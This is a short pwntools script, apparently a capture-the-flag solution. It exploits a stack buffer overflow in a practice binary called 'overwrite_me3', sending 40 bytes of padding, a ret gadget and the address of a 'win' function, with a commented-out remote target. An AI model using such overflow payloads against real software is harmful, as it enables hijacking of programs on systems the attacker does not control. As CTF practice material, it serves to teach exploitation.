from pwn import *

def conn():
    r = process("./overwrite_me3")
    gdb.attach(r)

    # r = remote("13.48.160.64", 1003)

    return r


def main():
    r = conn()
    exe = ELF("./overwrite_me3")
    rop = ROP(exe)

    buffer = b"A"*40
    ret = rop.ret[0]
    value = exe.sym['win']
    payload = buffer + p64(ret) + p64(value)

    r.recvuntil(b"1-10:")
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()